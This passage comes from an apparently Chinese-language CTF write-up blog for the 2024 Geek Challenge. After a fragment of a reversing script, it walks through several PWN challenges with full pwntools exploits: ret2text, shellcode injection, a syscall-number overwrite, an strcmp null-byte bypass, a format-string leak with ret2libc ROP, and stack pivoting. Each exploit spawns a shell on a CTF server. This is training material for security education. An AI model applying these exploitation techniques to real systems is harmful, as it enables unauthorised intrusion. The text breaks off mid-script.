class="keyword">in</span> <span class="built_in">range</span>(<span class="number">85</span>):</span><br><span class="line">        j = num2[i] % <span class="number">0x55</span></span><br><span class="line">        <span class="keyword">while</span> v5[j]:</span><br><span class="line">            v3 = j + <span class="number">1</span></span><br><span class="line">            j = <span class="built_in">int</span>((j+<span class="number">1</span>)/<span class="number">85</span>)</span><br><span class="line">            j = v3 - <span class="number">85</span>*j</span><br><span class="line">        base1 += str_base[j]</span><br><span class="line">        v5[j] = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(base1)</span><br><span class="line"></span><br><span class="line">deckey3(num2)</span><br><span class="line">base1 = <span class="string">&#x27;eM+wr=x8aYZ/[zU$yRB&amp;kbO;%p0P5f*7d(n]1Eug4ojc62AC,v39!h-^qQ.G?s)i:DFlS&lt;&gt;#@HINJTmtKLVWX&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1>
<h2 id="简单的签到"><a class="markdownIt-Anchor" href="#简单的签到"></a> 简单的签到</h2>
<ul>
<li>拿到附件先使用IDA进行分析</li>
<li>得到的结果就是，随机生成俩个数字，求他们的乘积</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241101235029270.png" alt="image-20241101235029270"></p>
<ul>
<li>
<p>这题就是简单的计算题，但是这题是有时间限制的，所以这就需要我们会使用<code>pwntools</code>写脚本</p>
</li>
<li>
<p>下面就是对应的交互脚本</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">25441</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;t our challenge.\n&#x27;</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">a = p.recvuntil(<span class="string">b&#x27;=&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = <span class="built_in">eval</span>(a.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Correct! Opening shell...&#x27;</span>,<span class="string">b&#x27;cat flag\x00\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>得到flag</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;479822ae-143b-4980-8a30-c9098a1f0040&#125;</span><br></pre></td></tr></table></figure>
<h2 id="你会栈溢出吗"><a class="markdownIt-Anchor" href="#你会栈溢出吗"></a> 你会栈溢出吗</h2>
<ul>
<li>还是下载好附件后使用IDA反编译该文件，发现<code>gets</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241102001020446.png" alt="image-20241102001020446"></p>
<ul>
<li>然后还发现了<code>system(&quot;/bin/sh&quot;)</code>这个函数</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241102001705200.png" alt="image-20241102001705200"></p>
<ul>
<li>思路就是<code>ret2text</code>，栈溢出到<code>key</code>这边即可拿到<code>shell</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">37273</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">0x8</span>) + p64(<span class="number">0x40073D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag\x00\n&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241102001914035.png" alt="image-20241102001914035"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;e2842599-dd38-45c7-a451-dae0e62e4105&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ez_shellcode"><a class="markdownIt-Anchor" href="#ez_shellcode"></a> ez_shellcode</h2>
<ul>
<li>简单的shellcode+栈溢出的运用</li>
<li>使用IDA打开对该二进制文件进行反编译后就会出现如下代码</li>
<li>发现有<code>gets</code>栈溢出，然后还开辟了一个内存空间给我们注入<code>shellcode</code></li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241102000145811.png" alt="image-20241102000145811"></p>
<ul>
<li>思路就是将shellcode注入开辟的内存空间，然后使用<code>gets</code>栈溢出返回到shellcode，并且执行shellcode，然后getshell</li>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">11758</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;do you know shellcode?\n&#x27;</span>,payload)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> +p64(<span class="number">0x401464</span>) +p64(<span class="number">0x401256</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;please input your name:\n&#x27;</span>,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>打出来可以直接获得flag</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;26692bf7-e59b-4995-9a7a-9b6fc2435e13&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241102000717311.png" alt="image-20241102000717311"></p>
<h2 id="over_flow"><a class="markdownIt-Anchor" href="#over_flow"></a> over_flow？？</h2>
<ul>
<li>拿到附件后老样子，查看保护机制，发现开了金丝雀</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113165605098.png" alt="image-20241113165605098"></p>
<ul>
<li>之后使用IDA打开，对该文件进行反编译，发现是一个文件管理系统</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113165641023.png" alt="image-20241113165641023"></p>
<ul>
<li>然后在自定义read文件的函数这边找到了一个溢出一个字节的漏洞</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113165738379.png" alt="image-20241113165738379"></p>
<ul>
<li>然后再查看溢出到什么位置，发现可以溢出改变<code>open_fd</code>的值</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113165807213.png" alt="image-20241113165807213"></p>
<ul>
<li>而溢出改变的值刚好会当做系统调用号去使用</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241113165859480.png" alt="image-20241113165859480"></p>
<ul>
<li>这时思路就来了，直接溢出改成<code>execve</code>的系统调用号，然后将<code>filename</code>前八字节写入<code>/bin/sh\x00</code>，这样原本<code>filename</code>被当做地址传入，恰好又是<code>sh</code>的地址，直接getshell</li>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">35043</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p8(<span class="number">59</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="00000"><a class="markdownIt-Anchor" href="#00000"></a> 00000</h2>
<ul>
<li>继续使用IDA打开附件并反编译该附件，然后发现，该题会生成一个密码，然后使用<code>strcmp</code>函数比较用户输入的字符串和随机生成的密码是否相等</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241102002135128.png" alt="image-20241102002135128"></p>
<ul>
<li>接下来查看<code>generate_password</code>函数，该函数会读取<code>/dev/urandom</code>文件，该文件是用来生成随机数的</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241102002316341.png" alt="image-20241102002316341"></p>
<ul>
<li>
<p>本题就是利用<code>strcmp</code>漏洞，输入<code>\x00</code>对该字符串比较进行截断，然后随机数生成凭借概率，会让第一位生成<code>\x00</code>，这时比较两个正好相等，即可<code>cat flag</code></p>
</li>
<li>
<p>exp如下：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">30955</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter the password:&#x27;</span>,payload)</span><br><span class="line">    a = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Now you have the secret document, please keep it safe.\n&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="built_in">print</span>(p.recvline())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
<ul>
<li>这样即可得到flag</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241102002749364.png" alt="image-20241102002749364"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;6bf77f02-7b07-4ffd-9946-0d1afa5c9167&#125;</span><br></pre></td></tr></table></figure>
<h2 id="买黑吗喽了吗"><a class="markdownIt-Anchor" href="#买黑吗喽了吗"></a> 买黑吗喽了吗</h2>
<ul>
<li>下载好附件后先checksec一下该二进制附件，这里主要是开了pie，还要泄露程序的地址</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241106173005145.png" alt="image-20241106173005145"></p>
<ul>
<li>然后再来使用IDA反编译该二进制文件，反编译后就会发现这里面有一个栈溢出漏洞</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241106173212116.png" alt="image-20241106173212116"></p>
<ul>
<li>但是由于开了pie，所以我们还需要泄露一下程序的基地址，这样才能泄露libc</li>
<li>通过代码动态调试和代码审计可以得到如下逻辑</li>
<li>该处可以泄露Balance的地址，所以就泄露了main函数的地址</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241111085309723.png" alt="image-20241111085309723"></p>
<ul>
<li>但是要泄露Balance的地址就要满足<code>!strcmp(str1, str2)</code>为0，即<code>strcmp(str1, str2)</code>不为0</li>
<li>再查看这俩个字符串</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241111085503863.png" alt="image-20241111085503863"></p>
<ul>
<li><code>str1</code>就需要变得和str2不一样，并且之后printf函数的输出是str1字符串内的内容</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241111085607261.png" alt="image-20241111085607261"></p>
<ul>
<li>所以我们要修改str1，修改str1就需要执行如下，发现在比较Balance的时候是无符号整数的型式，同时我们要注意，我们修改的是解析格式化字符串的<code>%x</code>，如果我们修改成字母<code>aa</code>是可以绕过检查的，但是没办法达到我们的目的（即泄露地址）。所以这时我们就要修改成其他的格式化字符串，对之后的参数进行解析，所以这边我选择<code>%p</code>做为字符串格式化的解析字符。</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241111085706077.png" alt="image-20241111085706077"></p>
<ul>
<li>然后根据程序逻辑，我们要购买8次<code>wukong</code>，然后再购买一次<code>&lt;&lt;The Journey to the West&gt;&gt;</code>即可造成整数溢出</li>
<li>同时发现有个礼物</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241111090236242.png" alt="image-20241111090236242"></p>
<ul>
<li>所以思路如下，可以直接编写exp：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">23594</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./syscall&#x27;)</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shop</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;your choice:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;your choice:\n&#x27;</span>,<span class="built_in">str</span>(choice).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shop(<span class="number">1</span>)</span><br><span class="line">shop(<span class="number">1</span>)</span><br><span class="line">shop(<span class="number">1</span>)</span><br><span class="line">shop(<span class="number">1</span>)</span><br><span class="line">shop(<span class="number">1</span>)</span><br><span class="line">shop(<span class="number">1</span>)</span><br><span class="line">shop(<span class="number">1</span>)</span><br><span class="line">shop(<span class="number">1</span>)</span><br><span class="line">shop(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice:\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;And your Balance :&#x27;</span>)</span><br><span class="line">balance_addr = p.recvline()[<span class="number">3</span>:<span class="number">17</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;balance_addr----&gt;&quot;</span>,balance_addr)</span><br><span class="line">balance_addr = <span class="built_in">int</span>(balance_addr.decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(balance_addr))</span><br><span class="line">addr = balance_addr - <span class="number">0x4090</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice:\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x11f1</span>+addr</span><br><span class="line">pop_rsi = <span class="number">0x11f3</span>+addr</span><br><span class="line">puts_got = <span class="number">0x3FB0</span>+addr</span><br><span class="line">puts_plt = <span class="number">0x1090</span>+addr</span><br><span class="line">printf = <span class="number">0x3FC0</span>+addr</span><br><span class="line">Write_addr = <span class="number">0x14BC</span>+addr</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(Write_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Tell me your feedback:\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Thanks for your feedback!We`ll do it better!\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - <span class="number">0x84420</span></span><br><span class="line">sh_addr = libc_addr +   <span class="number">0x1b45bd</span></span><br><span class="line">sys_addr = <span class="number">0x52290</span> + libc_addr</span><br><span class="line">ret_addr = <span class="number">0x1570</span> + addr</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(sh_addr) +p64(ret_addr)+p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Tell me your feedback:\n&#x27;</span>,payload1)</span><br><span class="line">p.interactive()                                 </span><br></pre></td></tr></table></figure>
<h2 id="这里的空间有点小啊"><a class="markdownIt-Anchor" href="#这里的空间有点小啊"></a> 这里的空间有点小啊</h2>
<ul>
<li>拿到附件先检查一下保护机制，发现没开PIE和金丝雀</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241112093946257.png" alt="image-20241112093946257"></p>
<ul>
<li>然后使用IDA反编译该代码，同时发现溢出点</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241112094027793.png" alt="image-20241112094027793"></p>
<ul>
<li>但是只够溢出到返回地址，注意到汇编指令中有leave指令</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241112094117946.png" alt="image-20241112094117946"></p>
<ul>
<li>所以本题采用的就是栈迁移的方法来打</li>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment"># nc1.ctfplus.cn 24858</span></span><br><span class="line">p = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">46570</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">bss_addr = <span class="number">0x601800</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(bss_addr) + p64(<span class="number">0x40071C</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Now you can write something\n&#x27;</span>,payload)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(bss_addr+<span class="number">0x40</span>) + p64(<span class="number">0x40071C</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">rdi_ret = <span class="number">0x400853</span></span><br><span class="line">rsi_r15_ret = <span class="number">0x400851</span></span><br><span class="line">puts_got = <span class="number">0x600FD0</span></span><br><span class="line">puts_plt = <span class="number">0x400580</span></span><br><span class="line">payload2  = p64(bss_addr+<span class="number">0x40</span>)</span><br><span class="line">payload2 += p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x400708</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(bss_addr+<span class="number">0x10</span>) + p64(<span class="number">0x400738</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line"><span class="comment">#p.send(payload3)</span></span><br><span class="line">puts_addr = p.recvline()[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr----&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - <span class="number">0x80970</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x4F420</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x1B3D88</span></span><br><span class="line"><span class="comment">#sys_addr = puts_addr - 196832</span></span><br><span class="line"><span class="comment">#sh_addr = puts_addr + 1407016</span></span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(bss_addr+<span class="number">0x10</span>) + p64(<span class="number">0x40071C</span>)</span><br><span class="line"><span class="comment">#payload4  = b&#x27;a&#x27;*0x8 + p64(bss_addr+0x40)</span></span><br><span class="line"><span class="comment">#payload4 += p64(rdi_ret) + p64(sh_addr) +p64(sys_addr)</span></span><br><span class="line"><span class="comment">#payload4 += p64(bss_addr+0x18) + p64(0x40071C)</span></span><br><span class="line">p.send(payload4)</span><br><span class="line">payload5 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(bss_addr+<span class="number">0x40</span>) + p64(<span class="number">0x40071C</span>)</span><br><span class="line">p.send(payload5)</span><br><span class="line">payload6 = p64(bss_addr+<span class="number">0x40</span>)</span><br><span class="line">payload6 += p64(rdi_ret) + p64(sh_addr) +p64(<span class="number">0x400739</span>)+p64(sys_addr)</span><br><span class="line">payload6 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(bss_addr+<span class="number">0x10</span>) +p64(<span class="number">0x400738</span>)</span><br><span class="line">p.send(payload6)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="苏~~~~"><a class="markdownIt-Anchor" href="#苏~~~~"></a> 苏~~~~</h2>
<ul>
<li>简单的ret2libc</li>
<li>溢出点如下：</li>
</ul>
<p><img src="/2024/11/22/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/2024%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98wp/image-20241112105636960.png" alt="image-20241112105636960"></p>
<ul>
<li>exp如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./csu&#x27;</span>)</span><br><span 